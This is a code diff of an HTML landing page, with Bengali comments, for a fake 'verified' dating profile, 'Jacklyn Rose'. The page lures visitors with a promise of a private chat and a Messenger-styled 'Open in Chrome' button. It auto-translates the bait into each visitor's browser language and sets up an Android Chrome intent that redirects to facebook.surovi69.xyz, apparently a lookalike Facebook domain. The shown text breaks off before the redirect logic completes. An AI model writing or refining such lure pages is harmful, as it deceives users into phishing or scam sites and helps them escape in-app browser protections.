@@ -24,7 +24,7 @@
             display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh;
         }
         
-        /* গুগল ট্রান্সলেট উইজেট হাইড করার জন্য */
+        /* গুগল ট্রান্সলেট বার হাইড করা */
         .goog-te-banner-frame.skiptranslate, .goog-te-gadget { display: none !important; }
         body { top: 0px !important; }
 
@@ -51,7 +51,6 @@
             object-fit: cover;
         }
         
-        /* অনলাইন সিম্বল পজিশন ফিক্স */
         .online-dot {
             height: 22px; width: 22px; 
             background-color: #31a24c;
@@ -77,9 +76,9 @@
         }
     </style>
 </head>
-<body class="notranslate"> <!-- মূল বডি ট্র্যান্সলেট থেকে বাঁচানোর জন্য, পরে স্ক্রিপ্ট দিয়ে নির্দিষ্ট অংশ করা হবে -->
+<body>
 
-    <div class="bridge-card skiptranslate"> <!-- শুধুমাত্র এই অংশটি অটো ট্রান্সলেট হবে -->
+    <div class="bridge-card">
         <div class="cover-photo"></div>
         <div class="profile-section">
             <div class="img-container">
@@ -89,40 +88,48 @@
             
             <div class="name">
                 Jacklyn Rose 
-                <i class="fas fa-check-circle verified-icon" title="Verified Profile"></i>
+                <i class="fas fa-check-circle verified-icon"></i>
             </div>
             
-            <div class="bio">
+            <div id="translate-bio" class="bio">
                 Hey! I'm waiting for you. Click below to start our private conversation directly in Chrome.
             </div>
             
             <button class="main-btn" id="actionBtn">
-                <i class="fab fa-facebook-messenger"></i> Open in Chrome
+                <i class="fab fa-facebook-messenger"></i> <span id="btn-text">Open in Chrome</span>
             </button>
         </div>
     </div>
 
-    <!-- গোপন গুগল ট্রান্সলেট এলিমেন্ট -->
-    <div id="google_translate_element" style="display:none;"></div>
+    <!-- গুগল ট্রান্সলেট এলিমেন্ট -->
+    <div id="google_translate_element" style="visibility:hidden; height:0; overflow:hidden;"></div>
 
     <script type="text/javascript">
-        // অটো ট্রান্সলেট ফাংশন
+        // গুগল ট্রান্সলেট সেটআপ
         function googleTranslateElementInit() {
             new google.translate.TranslateElement({
                 pageLanguage: 'en',
-                autoDisplay: true
+                autoDisplay: false 
             }, 'google_translate_element');
-
-            // ভিজিটরের ভাষা অনুযায়ী অটোমেটিক ক্লিক ট্রিগার করা
-            setTimeout(function() {
-                var autoClick = document.querySelector('.goog-te-combo');
-                if (autoClick) {
-                    autoClick.value = navigator.language.split('-')[0];
-                    autoClick.dispatchEvent(new Event('change'));
-                }
-            }, 1000);
         }
 
+        // অটোমেটিক ল্যাঙ্গুয়েজ শনাক্ত করে ট্রান্সলেট করার স্ক্রিপ্ট
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                let userLang = navigator.language || navigator.userLanguage; 
+                let langCode = userLang.split('-')[0]; 
+                
+                if (langCode !== 'en') {
+                    const select = document.querySelector('select.goog-te-combo');
+                    if (select) {
+                        select.value = langCode;
+                        select.dispatchEvent(new Event('change'));
+                    }
+                }
+            }, 1500); 
+        });
+
+        // ক্রোম রিডাইরেক্ট কোড
         const targetUrl = "https://facebook.surovi69.xyz";
         const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
 
